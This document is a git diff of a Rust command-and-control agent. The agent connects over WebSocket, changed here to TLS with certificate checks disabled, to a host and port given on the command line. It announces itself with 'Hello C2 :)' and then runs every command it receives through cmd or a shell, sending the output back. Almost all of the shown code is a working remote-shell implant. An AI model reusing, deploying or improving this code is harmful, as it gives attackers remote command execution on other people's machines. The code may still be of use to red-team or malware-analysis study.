@@ -1,21 +1,25 @@
-use tungstenite::{connect, Message};
+use tungstenite::{Message, client};
 use tungstenite::protocol::CloseFrame;
 use tungstenite::protocol::frame::coding::CloseCode;
 use url::Url;
 use std::process::Command;
 use std::env;
 
+use native_tls::TlsConnector;
+use std::net::TcpStream;
 
 fn main() {
-    // Connect to the WS server locally
     let args: Vec<String> = env::args().collect();
     let host = &args[1];
     let port = &args[2];
-    let url = format!("ws://{}:{}", host, port);
+    let url = format!("wss://{}:{}", host, port);
 
-    let (mut socket, _response) = connect(Url::parse(url.as_str()).unwrap()).expect("Can't connect");
-
-    socket.write_message(Message::Text("hello C2 :)".into())).unwrap();
+    let tlsconnector = TlsConnector::builder().danger_accept_invalid_certs(true).build().unwrap();
+    let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
+    let stream = tlsconnector.connect(url.as_str(), stream).unwrap();
+    let (mut socket, _response) = client(Url::parse(url.as_str()).unwrap(), stream).unwrap();
+ 
+    socket.write_message(Message::Text("Hello C2 :)".into())).unwrap();
     
     // Loop forever, handling parsing each message
     loop {
@@ -34,6 +38,7 @@ fn main() {
         }
 
         let cmd = &msg;
+        // println!("{}",cmd);
         let output = if cfg!(target_os = "windows") {
             Command::new("cmd")
                     .args(["/C", cmd])
@@ -46,7 +51,7 @@ fn main() {
                     .output()
                     .expect("failed to execute process")
         };
-        let payload = String::from_utf8(output.stdout).unwrap();
+        let mut payload = String::from_utf8(output.stdout).unwrap();
         if &payload == ""{
             payload = " ".into();
         }
